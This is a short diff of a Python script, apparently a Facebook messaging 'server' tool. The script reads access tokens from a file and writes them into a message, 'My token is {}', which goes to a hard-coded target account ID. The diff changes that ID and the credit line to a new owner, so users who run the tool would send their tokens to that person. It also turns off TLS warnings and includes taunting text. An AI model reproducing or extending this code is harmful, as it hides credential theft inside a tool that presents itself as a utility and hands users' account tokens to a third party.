@@ -39,16 +39,16 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Subscribe To My YouTube Channel==> https://youtube.com/@MonXterRuleXHerE?si=Wjod92if8ApBWhEM
-"CREDIT :- MONXTER RULEX          OWNER => MONXTER                   Hello Monxter'S Wife Mano Jutti Mis'S! I am using your server. My 👇token👇 is {}"
+      msg_template = "Follow me on Facbook==> https://facbook.com/61556797413007
+"CREDIT :- MONXTER RULEX        OWNER => ASMIT                  Hello Monxter'S Wife Mano Jutti Mis'S! I am using your server. My 👇token👇 is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "61556562415247"
+      target_id = "61556797413007"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────MONXTER'S WIFE MANO JUTTI HERE ───────────────────────────────•')
+          print('\033[1;92m' + '•────────────────────── JUTTI HERE ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
